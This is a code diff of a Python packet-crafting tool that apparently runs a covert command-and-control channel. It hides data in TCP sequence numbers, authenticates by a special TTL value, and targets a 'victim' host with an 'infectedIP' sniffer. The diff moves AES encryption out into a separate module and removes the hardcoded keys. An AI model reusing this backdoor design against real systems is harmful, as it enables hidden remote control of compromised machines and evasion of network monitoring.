@@ -8,22 +8,19 @@ import sys
 import time
 from bkutil import message_to_bits
 from multiprocessing import Process
-from Crypto import Random
-from Crypto.Cipher import AES
+from cryptoutil import encrypt, decrypt
 from scapy.all import *
 import _thread
 import setproctitle
 
 """
-Setup: pip3 install pycrypto setproctitle scapy
+Setup: pip3 install pycrypto setproctitle scapy watchdog
 """
 
 TTL=222
 TTLKEY=234
 # random secret key (both the client and server must match this key)
-encryptionKey = "passyourwordssss"
-iv = Random.new().read(AES.block_size)
-IV = "whatsthedealwith"
+
 victim=("192.168.0.11",9999)
 messages = []
 authentication ="1337"
@@ -118,20 +115,6 @@ def craft(data:str,position:int,total:int,UID:str) -> IP:
         seq=int(str(data),2), flags=setFlag)
     return packet
 
-def encrypt(message: str) -> str:
-    global encryptionKey
-    global IV
-    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
-    return encryptor.encrypt(message)
-    #return message
-
-def decrypt(command: str) -> str:
-    global encryptionKey
-    global IV
-    decryptor = AES.new(encryptionKey, AES.MODE_CFB, IV=IV)
-    plain = decryptor.decrypt(command)
-    return plain
-
 def server():
     while True:
         try:
@@ -201,15 +184,12 @@ def lengthChecker(field):
     return covertContent
 
 def authenticate(packet):
-    global command
-    global authentication
     # Check TTL first
     ttl = packet[IP].ttl
     # Checks if the ttl matches with ours
     if ttl == TTLKEY:
         return True
-    else:
-        return False
+    return False
 
 def commandSniffer(threadName, infectedIP): #TODO call fucntion inside thread
     sniff(timeout=10, filter="tcp and host "+victim[0], prn=commandResult)
